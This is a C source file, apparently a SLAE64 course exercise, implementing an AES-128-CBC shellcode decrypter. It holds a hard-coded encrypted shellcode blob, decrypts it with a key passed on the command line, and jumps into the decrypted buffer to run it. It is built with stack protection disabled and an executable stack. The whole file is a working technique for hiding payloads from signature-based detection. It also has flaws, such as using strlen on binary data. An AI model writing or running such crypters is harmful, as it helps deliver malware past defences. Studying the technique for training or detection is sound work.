/*
 * Compile : gcc -fno-stack-protector -z execstack -lmcrypt aes-shellcode-decrypter.c -o aes-shellcode-decrypter
 *
 * Author : SLAE64-PA-6470 (kahlon81)
 * Date : 2018/02/21
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 */
#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

int encrypt(
    void* buffer,
    int buffer_len, /* Because the plaintext could include null bytes*/
    char* IV,
    char* key,
    int key_len
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);

  return 0;
}

int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);

  return 0;
}

void display_hex(char* cipher, int len) {
  int v;
  for (v=0; v<len; v++)
    //printf("\\x%2hhX", cipher[v]);
    printf("\\x%02x", cipher[v] & 0xff);
  printf("\n");
}

int main(int argc, char **argv)
{
  MCRYPT td, td2;
  unsigned char encrypted_shellcode[] = "\xca\x8a\x85\xae\xb4\x1c\xe4\x8d\x99\x24\xd0\x09\xaf\x56\x4b\x54\x1d\xb0\xce\xa5\xc0\xe3\x99\x4d\x31\x5a\x2d\x28\xed\x1e\x9a\x28";
  unsigned char *encrypted = encrypted_shellcode;
  char* IV = "AAAAAAAAAAAAAAAA";
  char* buffer;
  int buffer_len = strlen(encrypted);
  int (*sc)();

  // check param
  if (argc != 2) {
    printf("Usage : ./aes-shellcode-decrypter <128 bits encryption key>\n");
    printf("Example : ./aes-shellcode-decrypter 0123456789abcdef\n");
    exit(-1);
  }

  // input key
  char *key = (char *)argv[1];
  int keysize = strlen(key);

  printf("encrypt size=%d:\n", strlen(encrypted));
  display_hex(encrypted, strlen(encrypted));

  buffer = calloc(1, buffer_len);
  strncpy(buffer, encrypted, buffer_len);

  decrypt(buffer, buffer_len, IV, key, keysize);

  printf("decrypt size=%d:\n", strlen(buffer));
  display_hex(buffer, buffer_len);

  sc = (int(*)())buffer;
  sc();

  return 0;
}